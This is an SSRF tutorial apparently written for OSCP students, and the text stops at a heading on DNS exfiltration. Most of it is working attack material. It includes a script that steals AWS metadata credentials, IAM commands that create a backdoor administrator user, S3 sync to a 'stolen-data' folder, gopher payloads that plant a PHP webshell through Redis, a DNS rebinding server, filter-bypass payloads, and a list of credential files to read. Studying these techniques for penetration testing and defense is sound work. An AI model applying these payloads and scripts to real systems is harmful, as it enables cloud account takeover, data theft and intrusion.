
# Server-Side Request Forgery (SSRF): The Cloud Killer

## Table of Contents

1. [Executive Summary & OSCP Relevance](#1-executive-summary--oscp-relevance)
2. [ABSOLUTE BEGINNER: Understanding SSRF](#2-absolute-beginner-understanding-ssrf)
3. [SSRF Fundamentals & Attack Surface](#3-ssrf-fundamentals--attack-surface)
4. [Cloud Metadata Services Deep Dive](#4-cloud-metadata-services-deep-dive)
5. [AWS Instance Metadata Exploitation](#5-aws-instance-metadata-exploitation)
6. [Google Cloud Platform (GCP) Metadata](#6-google-cloud-platform-gcp-metadata)
7. [Azure Instance Metadata Service](#7-azure-instance-metadata-service)
8. [Internal Network Reconnaissance](#8-internal-network-reconnaissance)
9. [Protocol Smuggling Techniques](#9-protocol-smuggling-techniques)
10. [Filter Bypass Methods](#10-filter-bypass-methods)
11. [DNS Rebinding Attacks](#11-dns-rebinding-attacks)
12. [Blind SSRF Exploitation](#12-blind-ssrf-exploitation)
13. [SSRF to RCE Chains](#13-ssrf-to-rce-chains)
14. [Advanced Exploitation Techniques](#14-advanced-exploitation-techniques)
15. [SSRF in Common Applications](#15-ssrf-in-common-applications)
16. [Detection and Discovery](#16-detection-and-discovery)
17. [Automation Tools](#17-automation-tools)
18. [OSCP Attack Scenarios](#18-oscp-attack-scenarios)
19. [Defense Strategies](#19-defense-strategies)
20. [Common Pitfalls](#20-common-pitfalls)
21. [Hands-on Exercises](#21-hands-on-exercises)
22. [Interview Questions](#22-interview-questions)
23. [Summary & Key Takeaways](#23-summary--key-takeaways)
24. [References & Further Reading](#24-references--further-reading)

---

## 1. Executive Summary & OSCP Relevance

### What is Server-Side Request Forgery (SSRF)?

**SSRF** is a vulnerability where an attacker can force the server to make HTTP requests to arbitrary destinations. The server becomes a **proxy** for the attacker.

**Why It Matters**:
- Server can access **internal networks** (behind firewalls)
- Server can access **localhost services** (Redis, Elasticsearch, admin panels)
- Server can access **cloud metadata** (AWS keys, Azure credentials, GCP tokens)

**OWASP Ranking**: A10 in OWASP Top 10 (2021) - Rising threat

### OSCP Relevance (HIGH - 75%)

While less common than SQLi or XSS in traditional networks, SSRF is **critical** for:
- Internal network pivoting
- Accessing hidden admin panels
- Port scanning internal infrastructure
- Reading local files (file:// protocol)

**OSCP Scenarios**:
- Web app with URL fetching feature (webhooks, import from URL, image proxy)
- Cloud-based machines (AWS, Azure practice labs)
- Internal service exploitation (Redis, Memcached)

**Time Allocation**: 15-25 minutes per web app to test for SSRF

### Why SSRF is Devastating in the Cloud

```
Traditional Network:
┌─────────────────────────────────────┐
│  Firewall (Blocks external access)  │
│  ├─ Web Server (DMZ)                │
│  ├─ Database (Internal)             │
│  └─ Admin Panel (Internal)          │
└─────────────────────────────────────┘
Attacker → Firewall → Blocked ✓

With SSRF:
Attacker → Web Server → Database ✗
            (SSRF)     (Internal network access!)
```

**The Cloud Problem**:
```
AWS EC2 Instance:
- Has IAM role with S3 access
- Metadata service at 169.254.169.254 contains AWS keys
- No authentication required (assumed only VM can access)

SSRF Attack:
1. Force server to fetch: http://169.254.169.254/latest/meta-data/iam/security-credentials/
2. Server returns AWS keys (AccessKeyId, SecretAccessKey)
3. Attacker uses keys to access ALL S3 buckets
4. Game over: Data exfiltration, privilege escalation
```

---

## 2. ABSOLUTE BEGINNER: Understanding SSRF

### The Proxy Analogy

**Normal Web Request**:
```
You (Client) → Website (Server) → Response
```

**SSRF**:
```
You → Vulnerable Server → Internal Server → Response → You
              ↑
         Server acts as YOUR proxy
```

### Simple Example

**Legitimate Feature**: "Import profile picture from URL"

**How It Works**:
```
1. User enters: https://example.com/avatar.jpg
2. Server fetches the image
3. Server saves it locally
4. User sees their new profile picture
```

**SSRF Attack**:
```
1. Attacker enters: http://localhost:22
2. Server connects to its own SSH port
3. Server returns SSH banner
4. Attacker learns: SSH is running, version number
```

**Worse Attack**:
```
1. Attacker enters: http://169.254.169.254/latest/meta-data/iam/security-credentials/
2. Server fetches AWS metadata (thinks it's an image URL)
3. Server returns AWS access keys
4. Attacker steals cloud credentials
```

### ASCII Visualization

```
┌──────────────────────────────────────────────────────────┐
│                    SSRF Attack Flow                      │
└──────────────────────────────────────────────────────────┘

Internet               DMZ                Internal Network
                                         (Behind Firewall)

Attacker            Web Server              Redis Server
   │                   │                        │
   │ 1. POST /import  │                        │
   │    url=redis://  │                        │
   │    127.0.0.1:6379│                        │
   │──────────────────→│                        │
   │                   │                        │
   │                   │ 2. Connect to Redis    │
   │                   │───────────────────────→│
   │                   │                        │
   │                   │ 3. Redis response      │
   │                   │←───────────────────────│
   │                   │                        │
   │ 4. Response with  │                        │
   │    Redis data     │                        │
   │←──────────────────│                        │
   │                   │                        │
   
Attacker → Bypassed Firewall via Web Server!
```

---

## 3. SSRF Fundamentals & Attack Surface

### 3.1 Common Vulnerable Features

**1. URL-Based Features**:
- Image loading: "Load avatar from URL"
- Webhook callbacks: "Notify this URL when order completes"
- Import data: "Import CSV from URL"
- PDF generation: "Convert this webpage to PDF"
- Feed readers: "Subscribe to RSS feed"
- Link preview: "Generate preview for this link"
- QR code generation: "Create QR code for this URL"
- Image proxy/CDN: "Cache image from external source"

**2. File Upload**:
- SVG files with embedded URLs
- XML files (XXE to SSRF)
- PDF files (if processed by vulnerable renderer)

**3. Integrations**:
- Slack/Discord webhooks
- API integrations (Zapier, IFTTT)
- Payment gateways (IPN callbacks)

### 3.2 Vulnerable Code Examples

**Python (Flask)**:
```python
from flask import Flask, request
import requests

app = Flask(__name__)

@app.route('/fetch')
def fetch():
    url = request.args.get('url')
    # VULNERABLE: No validation!
    response = requests.get(url)
    return response.content

# Attack: /fetch?url=http://localhost:22
```

**PHP**:
```php
<?php
$url = $_GET['url'];
// VULNERABLE: file_get_contents accepts any URL
$content = file_get_contents($url);
echo $content;
?>

// Attack: ?url=file:///etc/passwd
```

**Node.js**:
```javascript
const express = require('express');
const axios = require('axios');

app.get('/proxy', async (req, res) => {
    const url = req.query.url;
    // VULNERABLE: No validation
    const response = await axios.get(url);
    res.send(response.data);
});

// Attack: /proxy?url=http://169.254.169.254/latest/meta-data/
```

**Java**:
```java
@GetMapping("/image")
public String getImage(@RequestParam String url) throws IOException {
    URL imageUrl = new URL(url);
    // VULNERABLE
    InputStream stream = imageUrl.openStream();
    return IOUtils.toString(stream);
}
```

### 3.3 Impact Classification

**Low Impact**:
- Port scanning internal network
- Service fingerprinting
- Information disclosure

**Medium Impact**:
- Access to internal APIs
- Reading local files
- Denial of Service (SSRF to infinite loop)

**High Impact**:
- Cloud metadata extraction (AWS keys)
- Remote Code Execution (SSRF → Redis → RCE)
- Complete infrastructure compromise

**Critical Impact**:
- Full AWS/GCP/Azure account takeover
- Lateral movement to production databases
- Supply chain attacks (compromising CI/CD)

---

## 4. Cloud Metadata Services Deep Dive

### 4.1 Why Metadata Services Exist

Cloud providers expose instance metadata to VMs for:
- Instance ID, hostname, region
- IAM role credentials (temporary AWS keys)
- User data (bootstrap scripts)
- Network configuration

**The Problem**: Designed for **localhost access only**, but SSRF breaks this assumption.

### 4.2 Common Metadata Endpoints

| Provider | Endpoint | Authentication |
|----------|----------|----------------|
| **AWS** | `http://169.254.169.254/` | None (v1) / Token (v2) |
| **Google Cloud** | `http://metadata.google.internal/` | Header required |
| **Azure** | `http://169.254.169.254/` | Header required |
| **DigitalOcean** | `http://169.254.169.254/` | None |
| **Oracle Cloud** | `http://169.254.169.254/` | None |
| **Alibaba Cloud** | `http://100.100.100.200/` | None |

### 4.3 AWS Link-Local Address (169.254.169.254)

**What is 169.254.169.254?**
- IPv4 Link-Local address (APIPA - Automatic Private IP Addressing)
- Used when DHCP fails
- Non-routable (only accessible from the local machine)
- AWS uses it for Instance Metadata Service (IMDS)

**Why It's Non-Routable**:
```bash
# Try pinging from your machine
ping 169.254.169.254
# Times out (not reachable from internet)

# But from AWS EC2 instance
curl http://169.254.169.254/latest/meta-data/
# Works! Returns metadata
```

---

## 5. AWS Instance Metadata Exploitation

### 5.1 IMDSv1 (Classic Attack)

**No authentication required** - just HTTP GET requests.

**Step-by-Step Exploitation**:

**Step 1: List Available Data**:
```bash
# Via SSRF: /fetch?url=http://169.254.169.254/latest/meta-data/

# Response:
ami-id
ami-launch-index
ami-manifest-path
hostname
iam/
instance-id
instance-type
local-hostname
local-ipv4
public-hostname
public-ipv4
security-groups
```

**Step 2: Check IAM Role**:
```bash
# /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Response:
S3-Admin-Role
```

**Step 3: Retrieve Credentials**:
```bash
# /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/S3-Admin-Role

# Response:
{
  "Code" : "Success",
  "LastUpdated" : "2024-01-24T12:00:00Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIAXXXXXXXXXXX",
  "SecretAccessKey" : "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token" : "IQoJb3JpZ2luX2VjEHgaCXVzLWVhc3QtMSJIMEYCIQD...",
  "Expiration" : "2024-01-24T18:00:00Z"
}
```

**Step 4: Use Credentials Locally**:
```bash
# Configure AWS CLI
export AWS_ACCESS_KEY_ID=ASIAXXXXXXXXXXX
export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEHgaCXVzLWVhc3QtMSJIMEYCIQD...

# Test access
aws sts get-caller-identity

# Response:
{
    "UserId": "AIDAI...",
    "Account": "123456789012",
    "Arn": "arn:aws:sts::123456789012:assumed-role/S3-Admin-Role/i-1234567890abcdef0"
}

# List S3 buckets
aws s3 ls

# Download all data
aws s3 sync s3://company-secrets ./stolen-data/
```

**Step 5: Privilege Escalation**:
```bash
# Check permissions
aws iam list-attached-role-policies --role-name S3-Admin-Role

# If role has admin access
aws iam create-access-key --user-name admin

# Create backdoor user
aws iam create-user --user-name backdoor
aws iam attach-user-policy --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-access-key --user-name backdoor
```

### 5.2 IMDSv2 (Session-Based)

**AWS introduced v2 to mitigate SSRF**. Requires:
1. PUT request to get session token
2. Include token in subsequent requests via header

**Normal Workflow**:
```bash
# Step 1: Get token (PUT request)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
             -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Step 2: Use token to get metadata (GET request with header)
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
     http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Why This Stops Most SSRF**:
- Standard SSRF only allows GET requests
- Cannot send PUT request to get token
- Cannot add custom headers

**Bypasses**:

**A. Full Request Control (CRLF Injection)**:
```python
# If you can inject newlines into the URL
url = "http://169.254.169.254/latest/api/token HTTP/1.1\r\n"
url += "X-aws-ec2-metadata-token-ttl-seconds: 21600\r\n"
url += "Host: 169.254.169.254\r\n"
url += "\r\n"
url += "PUT /latest/api/token HTTP/1.1\r\n"
# Server might interpret this as a PUT request
```

**B. Server-Side Request Library Supports PUT**:
```python
# If vulnerable code allows method override
import requests

# Some libraries accept method parameter
url = request.args.get('url')
method = request.args.get('method', 'GET')
response = requests.request(method, url)

# Attack: /fetch?url=http://169.254.169.254/latest/api/token&method=PUT
```

**C. Default IMDSv1 Fallback**:
```bash
# Many AWS instances still have v1 enabled
# Check if v1 works first
curl http://169.254.169.254/latest/meta-data/
# If this returns data, v1 is enabled!
```

### 5.3 AWS User Data Extraction

**User Data** = Bootstrap script run on instance launch (often contains secrets).

```bash
# Via SSRF
/fetch?url=http://169.254.169.254/latest/user-data

# Example response (base64 encoded script):
#!/bin/bash
export DB_PASSWORD="SuperSecretPassword123"
export API_KEY="sk_live_abc123xyz"
mysql -u admin -p$DB_PASSWORD -e "CREATE DATABASE app;"
```

**Gold Mine**: Database passwords, API keys, encryption keys.

### 5.4 Complete AWS Exploitation Script

```python
#!/usr/bin/env python3
import requests
import json

# Target SSRF endpoint
SSRF_URL = "http://target.com/fetch?url="

def ssrf_get(path):
    """Fetch via SSRF"""
    url = SSRF_URL + "http://169.254.169.254" + path
    response = requests.get(url)
    return response.text

def exploit_aws_metadata():
    print("[*] Attempting AWS Metadata Exploitation")
    
    # Check if metadata is accessible
    try:
        meta = ssrf_get("/latest/meta-data/")
        if "iam/" not in meta:
            print("[-] No IAM role attached")
            return
        print("[+] IAM role detected!")
    except:
        print("[-] Metadata service not accessible")
        return
    
    # Get IAM role name
    role_name = ssrf_get("/latest/meta-data/iam/security-credentials/").strip()
    print(f"[+] IAM Role: {role_name}")
    
    # Get credentials
    creds_json = ssrf_get(f"/latest/meta-data/iam/security-credentials/{role_name}")
    creds = json.loads(creds_json)
    
    print("\n[+] AWS Credentials Extracted:")
    print(f"    AccessKeyId: {creds['AccessKeyId']}")
    print(f"    SecretAccessKey: {creds['SecretAccessKey']}")
    print(f"    Token: {creds['Token'][:50]}...")
    
    # Get user data
    user_data = ssrf_get("/latest/user-data")
    if user_data:
        print(f"\n[+] User Data:\n{user_data}")
    
    # Save credentials
    with open("aws_creds.sh", "w") as f:
        f.write(f"export AWS_ACCESS_KEY_ID={creds['AccessKeyId']}\n")
        f.write(f"export AWS_SECRET_ACCESS_KEY={creds['SecretAccessKey']}\n")
        f.write(f"export AWS_SESSION_TOKEN={creds['Token']}\n")
    
    print("\n[+] Credentials saved to aws_creds.sh")
    print("    Run: source aws_creds.sh && aws sts get-caller-identity")

if __name__ == "__main__":
    exploit_aws_metadata()
```

---

## 6. Google Cloud Platform (GCP) Metadata

### 6.1 GCP Metadata Service

**Endpoint**: `http://metadata.google.internal/computeMetadata/v1/`

**Defense**: Requires header `Metadata-Flavor: Google`

### 6.2 Exploitation (Header Injection Required)

**Standard SSRF (Blocked)**:
```bash
# Won't work without header
curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Response: 403 Forbidden
```

**If Header Injection is Possible**:
```python
# Vulnerable code that accepts headers
headers = {}
if request.args.get('header'):
    key, value = request.args.get('header').split(':')
    headers[key] = value

response = requests.get(url, headers=headers)

# Attack
/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token&header=Metadata-Flavor:Google
```

### 6.3 GCP Service Account Tokens

**Retrieve OAuth Token**:
```bash
# Via SSRF with header
GET /computeMetadata/v1/instance/service-accounts/default/token
Metadata-Flavor: Google

# Response:
{
  "access_token": "ya29.c.Kp8BCg...",
  "expires_in": 3599,
  "token_type": "Bearer"
}
```

**Use Token**:
```bash
# List GCP projects
curl -H "Authorization: Bearer ya29.c.Kp8BCg..." \
     https://cloudresourcemanager.googleapis.com/v1/projects

# List GCS buckets
curl -H "Authorization: Bearer ya29.c.Kp8BCg..." \
     https://storage.googleapis.com/storage/v1/b
```

### 6.4 GCP Metadata Endpoints

```bash
# Project ID
/computeMetadata/v1/project/project-id

# Instance name
/computeMetadata/v1/instance/name

# Service account email
/computeMetadata/v1/instance/service-accounts/default/email

# Service account token
/computeMetadata/v1/instance/service-accounts/default/token

# SSH keys
/computeMetadata/v1/instance/attributes/ssh-keys

# Startup script
/computeMetadata/v1/instance/attributes/startup-script
```

---

## 7. Azure Instance Metadata Service

### 7.1 Azure Metadata

**Endpoint**: `http://169.254.169.254/metadata/instance?api-version=2021-02-01`

**Defense**: Requires header `Metadata: true`

### 7.2 Exploitation

**If Header Injection**:
```bash
# Get instance metadata
curl -H "Metadata: true" \
     "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# Response (JSON with instance details):
{
  "compute": {
    "azEnvironment": "AZUREPUBLICCLOUD",
    "location": "eastus",
    "name": "myVM",
    "resourceGroupName": "myResourceGroup",
    ...
  }
}
```

**Get Managed Identity Token**:
```bash
curl -H "Metadata: true" \
     "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Response:
{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGc...",
  "expires_in": "3599",
  "token_type": "Bearer"
}
```

**Use Token to Access Azure Resources**:
```bash
# List subscriptions
curl -H "Authorization: Bearer eyJ0eXAi..." \
     https://management.azure.com/subscriptions?api-version=2020-01-01

# List storage accounts
curl -H "Authorization: Bearer eyJ0eXAi..." \
     https://management.azure.com/subscriptions/{subscription-id}/providers/Microsoft.Storage/storageAccounts?api-version=2021-04-01
```

---

## 8. Internal Network Reconnaissance

### 8.1 Port Scanning via SSRF

**Concept**: Use SSRF to scan internal ports.

**Timing-Based Detection**:
```python
import requests
import time

SSRF_URL = "http://target.com/fetch?url="

def scan_port(ip, port):
    start = time.time()
    try:
        requests.get(f"{SSRF_URL}http://{ip}:{port}", timeout=5)
    except:
        pass
    elapsed = time.time() - start
    return elapsed

# Scan common ports
for port in [22, 80, 443, 3306, 5432, 6379, 8080, 9200]:
    elapsed = scan_port("10.0.0.5", port)
    
    if elapsed < 1:  # Fast response = port open
        print(f"[+] Port {port} OPEN")
    else:  # Timeout = port closed/filtered
        print(f"[-] Port {port} CLOSED")
```

**Response-Based Detection**:
```bash
# Different responses indicate port state
/fetch?url=http://10.0.0.5:22
→ "SSH-2.0-OpenSSH_7.4" (Port open, SSH banner)

/fetch?url=http://10.0.0.5:9999
→ "Connection refused" (Port closed)

/fetch?url=http://10.0.0.5:3306
→ MySQL handshake bytes (Port open, MySQL)
```

### 8.2 Service Fingerprinting

**Redis**:
```bash
# SSRF to Redis (default port 6379)
/fetch?url=http://10.0.0.5:6379

# Response (if unprotected):
-ERR unknown command 'GET'
# Confirms Redis is running!
```

**Elasticsearch**:
```bash
# SSRF to Elasticsearch (default port 9200)
/fetch?url=http://10.0.0.5:9200

# Response:
{
  "name" : "elasticsearch-master",
  "cluster_name" : "production",
  "version" : {
    "number" : "7.10.0"
  }
}
```

**Memcached**:
```bash
# SSRF to Memcached (default port 11211)
/fetch?url=http://10.0.0.5:11211

# Response:
ERROR
# Indicates Memcached is running
```

### 8.3 Internal Web Applications

**Common Internal Targets**:
```
- Jenkins: http://10.0.0.10:8080
- Kubernetes API: https://10.0.0.1:443
- Docker API: http://10.0.0.20:2375
- Consul: http://10.0.0.30:8500
- Prometheus: http://10.0.0.40:9090
- Grafana: http://10.0.0.50:3000
```

**Example: Jenkins Exploitation**:
```bash
# Discover Jenkins
/fetch?url=http://10.0.0.10:8080

# Response contains: "Jenkins ver. 2.289"

# Check if script console is accessible
/fetch?url=http://10.0.0.10:8080/script

# If accessible (no auth), RCE possible via Groovy script
```

### 8.4 Network Mapping Script

```python
#!/usr/bin/env python3
import requests
from concurrent.futures import ThreadPoolExecutor

SSRF_URL = "http://target.com/fetch?url="
INTERNAL_RANGES = [
    "10.0.0.0/24",
    "192.168.1.0/24",
    "172.16.0.0/24"
]
PORTS = [22, 80, 443, 3306, 5432, 6379, 8080, 9200]

def check_host_port(ip, port):
    url = f"{SSRF_URL}http://{ip}:{port}"
    try:
        r = requests.get(url, timeout=3)
        if r.status_code == 200 or len(r.content) > 0:
            return (ip, port, "OPEN", r.text[:100])
    except:
        pass
    return None

def scan_network():
    results = []
    
    # Generate IPs (simplified for single /24)
    ips = [f"10.0.0.{i}" for i in range(1, 255)]
    
    tasks = [(ip, port) for ip in ips for port in PORTS]
    
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = [executor.submit(check_host_port, ip, port) for ip, port in tasks]
        
        for future in futures:
            result = future.result()
            if result:
                results.append(result)
                print(f"[+] {result[0]}:{result[1]} - {result[2]}")
    
    return results

if __name__ == "__main__":
    print("[*] Starting internal network scan via SSRF")
    results = scan_network()
    print(f"\n[+] Found {len(results)} open ports")
```

---

## 9. Protocol Smuggling Techniques

### 9.1 Gopher Protocol

**What is Gopher?**
- Legacy protocol (pre-HTTP)
- Allows sending **raw bytes** over TCP
- Critical for exploiting Redis, Memcached, SMTP, etc.

**Syntax**: `gopher://host:port/_<url-encoded-data>`

**Example: Redis RCE via Gopher**:

```bash
# Redis command to write webshell:
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET shell "<?php system($_GET['cmd']); ?>"
SAVE

# Convert to Gopher protocol:
gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html%0D%0ACONFIG%20SET%20dbfilename%20shell.php%0D%0ASET%20shell%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%22%0D%0ASAVE%0D%0A

# URL encode for SSRF:
/fetch?url=gopher://127.0.0.1:6379/_%0D%0ACONFIG%2520SET%2520dir%2520%252Fvar%252Fwww%252Fhtml%0D%0A...
```

**Gopher Generator Script**:
```python
#!/usr/bin/env python3
from urllib.parse import quote

def generate_gopher_redis(commands):
    """Generate Gopher URL for Redis commands"""
    payload = ""
    for cmd in commands:
        payload += cmd + "\r\n"
    
    gopher_url = f"gopher://127.0.0.1:6379/_{quote(payload)}"
    return gopher_url

# Commands to write webshell
commands = [
    "CONFIG SET dir /var/www/html",
    "CONFIG SET dbfilename shell.php",
    "SET shell '<?php system($_GET[\"cmd\"]); ?>'",
    "SAVE"
]

print(generate_gopher_redis(commands))
```

### 9.2 File Protocol

**Reading Local Files**:
```bash
# Linux
/fetch?url=file:///etc/passwd
/fetch?url=file:///etc/shadow (if permissions allow)
/fetch?url=file:///home/user/.ssh/id_rsa
/fetch?url=file:///var/www/html/config.php

# Windows
/fetch?url=file:///C:/Windows/System32/drivers/etc/hosts
/fetch?url=file:///C:/inetpub/wwwroot/web.config
```

**Common Targets**:
```
Linux:
- /etc/passwd (user enumeration)
- /etc/shadow (password hashes if readable)
- /proc/self/environ (environment variables)
- /proc/self/cmdline (process command line)
- /var/log/apache2/access.log (log files)
- /home/<user>/.bash_history (command history)

Windows:
- C:\Windows\System32\config\SAM (password hashes)
- C:\inetpub\logs\LogFiles\W3SVC1\*.log
- C:\xampp\apache\conf\httpd.conf
```

### 9.3 Dict Protocol

**What is Dict?**
- Dictionary lookup protocol
- Can be used for banner grabbing

**Example**:
```bash
# Banner grab SSH
/fetch?url=dict://10.0.0.5:22

# Response: SSH version banner
```

### 9.4 LDAP Protocol

**LDAP Queries via SSRF**:
```bash
/fetch?url=ldap://10.0.0.5:389/dc=company,dc=com
```

### 9.5 SMTP Protocol (Email Injection)

**Send Email via SSRF**:
```bash
# Gopher to SMTP
gopher://mail.internal.com:25/_MAIL%20FROM:attacker@evil.com%0D%0ARCPT%20TO:admin@company.com%0D%0ADATA%0D%0ASubject:%20SSRF%20Test%0D%0A%0D%0AThis%20email%20was%20sent%20via%20SSRF.%0D%0A.%0D%0AQUIT%0D%0A
```

---

## 10. Filter Bypass Methods

### 10.1 IP Address Representation

**Standard**: `127.0.0.1`

**Bypasses**:

**A. Decimal Notation**:
```python
# Convert IP to decimal
def ip_to_decimal(ip):
    octets = ip.split('.')
    decimal = (int(octets[0]) << 24) + (int(octets[1]) << 16) + (int(octets[2]) << 8) + int(octets[3])
    return decimal

# 127.0.0.1 → 2130706433
print(ip_to_decimal("127.0.0.1"))

# SSRF bypass
/fetch?url=http://2130706433/
```

**B. Octal Notation**:
```bash
# 127.0.0.1 in octal
0177.0.0.1

# SSRF
/fetch?url=http://0177.0.0.1/
```

**C. Hexadecimal**:
```bash
# 127.0.0.1 in hex
0x7f000001

# Or mixed
0x7f.0.0.1

# SSRF
/fetch?url=http://0x7f.0.0.1/
```

**D. IPv6 Localhost**:
```bash
# IPv6 representations of localhost
[::1]
[0:0:0:0:0:0:0:1]
[0000:0000:0000:0000:0000:0000:0000:0001]

# SSRF
/fetch?url=http://[::1]/
```

**E. Mixed Representations**:
```bash
127.1
127.0.1
127.00.00.01
```

### 10.2 DNS-Based Bypasses

**Wildcard DNS Services**:

**A. nip.io**:
```bash
# 127.0.0.1.nip.io → resolves to 127.0.0.1
/fetch?url=http://127.0.0.1.nip.io/

# 169.254.169.254.nip.io → AWS metadata
/fetch?url=http://169.254.169.254.nip.io/latest/meta-data/
```

**B. xip.io**:
```bash
# Similar to nip.io
/fetch?url=http://169.254.169.254.xip.io/
```

**C. sslip.io**:
```bash
/fetch?url=http://169-254-169-254.sslip.io/
```

**D. Own DNS Server**:
```bash
# Set up DNS server that resolves attacker.com → 127.0.0.1
# Then:
/fetch?url=http://attacker.com/
```

### 10.3 URL Encoding Bypasses

**Single Encoding**:
```bash
# @ symbol encoded
http://127.0.0.1 → http://%31%32%37.%30.%30.%31

# localhost encoded
http://localhost → http://%6c%6f%63%61%6c%68%6f%73%74
```

**Double Encoding**:
```bash
# % → %25
http://127.0.0.1 → http://%2531%2532%2537.%2530.%2530.%2531
```

### 10.4 Redirect-Based Bypasses

**Open Redirect Chain**:
```bash
# If filter checks initial URL but follows redirects:

# Step 1: Create redirect
# attacker.com/redirect.php:
<?php
header("Location: http://169.254.169.254/latest/meta-data/");
?>

# Step 2: SSRF payload
/fetch?url=http://attacker.com/redirect.php
```

**Shortlink Services**:
```bash
# Create bit.ly link → 169.254.169.254
# SSRF payload
/fetch?url=http://bit.ly/abc123
```

### 10.5 Parser Confusion

**Different URL parsers interpret URLs differently**:

```bash
# Example: http://user:pass@evil.com:80@victim.com/

Parser 1 (Python urllib):
  Host: evil.com
  
Parser 2 (cURL):
  Host: victim.com
  
# If validator uses Parser 1 but fetcher uses Parser 2:
# Validator sees: evil.com (allowed)
# Fetcher accesses: victim.com (internal)
```

**Attack Examples**:
```bash
http://localhost@attacker.com/
http://attacker.com#@127.0.0.1/
http://127.0.0.1%00.attacker.com/  (null byte)
http://[::]:80@127.0.0.1/
```

### 10.6 CRLF Injection in URLs

**If application vulnerable to CRLF**:
```python
# Inject newlines to create custom request
url = "http://example.com/path HTTP/1.1\r\n"
url += "Host: 169.254.169.254\r\n"
url += "\r\n"
url += "GET /latest/meta-data/ HTTP/1.1\r\n"
url += "Host: 169.254.169.254\r\n"

# URL encoded
/fetch?url=http://example.com/path%20HTTP/1.1%0D%0AHost:%20169.254.169.254%0D%0A%0D%0AGET%20/latest/meta-data/%20HTTP/1.1%0D%0AHost:%20169.254.169.254%0D%0A
```

---

## 11. DNS Rebinding Attacks

### 11.1 How DNS Rebinding Works

**Concept**: Change DNS resolution between validation and fetching.

**Attack Flow**:
```
1. Attacker controls domain: evil.com
2. Sets DNS TTL to 0 (no caching)

3. Server validates: "Is evil.com safe?"
   → DNS query: evil.com → 1.1.1.1 (safe public IP)
   → Validator: "1.1.1.1 is allowed" ✓

4. Time passes (milliseconds)

5. Server fetches: "GET http://evil.com/"
   → DNS query: evil.com → 127.0.0.1 (localhost!)
   → Server connects to localhost
   
6. SSRF achieved!
```

### 11.2 Setting Up DNS Rebinding

**Option 1: Use Existing Service**:
```bash
# rebind.it
# Alternates between two IPs
http://A.B.C.D.1time.127.0.0.1.rebind.it/

# First resolution: A.B.C.D (safe IP)
# Second resolution: 127.0.0.1 (localhost)
```

**Option 2: Custom DNS Server**:
```python
#!/usr/bin/env python3
from dnslib.server import DNSServer, BaseResolver
from dnslib import RR, QTYPE, A
import time

class RebindResolver(BaseResolver):
    def __init__(self):
        self.first_query = True
    
    def resolve(self, request, handler):
        qname = str(request.q.qname)
        
        if self.first_query:
            # First query: return safe IP
            reply = request.reply()
            reply.add_answer(RR(qname, QTYPE.A, rdata=A("1.1.1.1"), ttl=0))
            self.first_query = False
        else:
            # Second query: return localhost
            reply = request.reply()
            reply.add_answer(RR(qname, QTYPE.A, rdata=A("127.0.0.1"), ttl=0))
        
        return reply

# Start DNS server
resolver = RebindResolver()
server = DNSServer(resolver, port=53)
server.start()
```

### 11.3 Defense Against DNS Rebinding

**Secure Implementation**:
```python
import socket
import requests

def safe_fetch(url):
    # Parse URL
    from urllib.parse import urlparse
    parsed = urlparse(url)
    
    # Resolve hostname ONCE
    ip = socket.gethostbyname(parsed.hostname)
    
    # Validate IP is not internal
    if ip.startswith('127.') or ip.startswith('10.') or ip.startswith('192.168.'):
        raise ValueError("Internal IP not allowed")
    
    # Use resolved IP directly (prevent re-resolution)
    safe_url = url.replace(parsed.hostname, ip)
    
    return requests.get(safe_url, allow_redirects=False)
```

---

## 12. Blind SSRF Exploitation

### 12.1 What is Blind SSRF?

**Scenario**: Server makes the request, but doesn't return the response.

**Example**:
```php
<?php
$url = $_POST['webhook'];
file_get_contents($url);  // No output returned
echo "Webhook registered successfully";
?>
```

**Challenge**: How to detect/exploit without seeing response?

### 12.2 Out-of-Band Detection

**A. Burp Collaborator**:
```bash
# Burp generates unique subdomain: abc123.burpcollaborator.net

# SSRF payload
/webhook?url=http://abc123.burpcollaborator.net

# Check Burp Collaborator for DNS/HTTP requests
# If request received → SSRF confirmed!
```

**B. Interactsh (Open-Source Alternative)**:
```bash
# Install
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

# Run
interactsh-client

# Generates: c123xyz.interact.sh

# SSRF payload
/webhook?url=http://c123xyz.interact.sh

# Terminal shows incoming requests
```

**C. Own Server**:
```bash
# Start HTTP server
python3 -m http.server 8080

# Get public IP (or use ngrok)
curl ifconfig.me
# Example: 203.0.113.5

# SSRF payload
/webhook?url=http://203.0.113.5:8080/test

# Check terminal for incoming request
```

### 12.3 Time-Based Exploitation

**Port Scanning**:
```python
import requests
import time

def blind_port_scan(ip, port):
    start = time.time()
    try:
        # Webhook that doesn't return response
        requests.post("http://target.com/webhook", 
                      data={"url": f"http://{ip}:{port}"}, 
                      timeout=10)
    except:
        pass
    elapsed = time.time() - start
    return elapsed

# Open port: fast response (~0.5s)
# Closed port: timeout (~10s)

for port in [22, 80, 443, 3306, 6379]:
    elapsed = blind_port_scan("10.0.0.5", port)
    if elapsed < 2:
        print(f"[+] Port {port} likely OPEN")
    else:
        print(f"[-] Port {port} likely CLOSED")
```

### 12.4 Data Exfiltration via DNS

